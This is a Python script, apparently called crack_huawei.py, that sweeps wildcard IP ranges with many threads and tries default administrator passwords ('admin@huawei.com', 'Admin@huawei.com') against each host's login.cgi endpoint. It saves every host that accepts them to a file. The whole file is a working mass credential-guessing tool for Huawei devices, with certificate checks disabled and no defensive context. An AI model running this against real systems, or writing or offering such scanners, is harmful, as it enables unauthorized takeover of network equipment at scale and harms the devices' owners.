#!/usr/bin/python
# -*- coding: UTF-8 -*-

import requests,sys
from optparse import OptionParser 
from multiprocessing.dummy import Pool as ThreadPool
import urllib3
urllib3.disable_warnings()


def save_result(url, password, savefile):
    with open(savefile, 'a') as w:
        w.write("%s, %s \n" % (url, password, ))


def isLogin(ip, savefile):
    # print(ip)
    try:
        res = requests.post("https://{}/login.cgi?_=0.45693894434582294".format(ip), data="UserName=admin&Password=admin@huawei.com&Edition=0",  verify=False, timeout=5, proxies={"https":"http://127.0.0.1:8080"})
        # print(res.text)
        if "Token=" in res.text:
            print(res.url, 'admin@huawei.com')
            save_result(res.url, 'admin@huawei.com', savefile)
            return True
    except Exception as e:
        # print(e)
        return False

    try:
        res = requests.post("https://{}/login.cgi".format(ip), data="UserName=admin&Password=Admin@huawei.com&Edition=0",  verify=False, timeout=5, proxies={"https":"http://127.0.0.1:8080"})
        if "Token=" in res.text:
            print(res.url, 'Admin@huawei.com')
            save_result(res.url, 'Admin@huawei.com', savefile)
            return True
    except Exception as e:
        pass
    return False

def star_convert(words):
    rnt = []
    if "*" not in words:
        return [words, ]

    for i in range(len(words)):
        word = words[i]
        if word == '*':
            for j in range(256):
                words_arr = list(words)
                words_arr[i] = str(j)
                new_word = "".join(words_arr)
                if "*" in new_word:
                    rnt += star_convert(new_word)
                else:
                    rnt.append(new_word)

    return rnt

if __name__ == "__main__":
    parser = OptionParser() 
    parser.add_option("-p", "--ip", action="store", 
                      dest="ip", 
                      help="target ip, eg 192.168.*.*") 
    parser.add_option("-t", "--thread", action="store", 
                      dest="thread", 
                      default=10, 
                      help="thread number")
    parser.add_option("-o", "--output", action="store", 
                      dest="output", 
                      default='out.txt', 
                      help="save output txt file")
    (options, args) = parser.parse_args() 
    ip_targets = options.ip
    thread_num = int(options.thread)
    savefile   = options.output
    # print(options.ip)
    if not options.ip:
        print('python crack_huawei.py -h')
        sys.exit()

    pool = ThreadPool(thread_num)
    for ip in star_convert(ip_targets):
        # print(ip)
        pool.apply_async(isLogin, (ip, savefile, ))

    pool.close()
    pool.join()
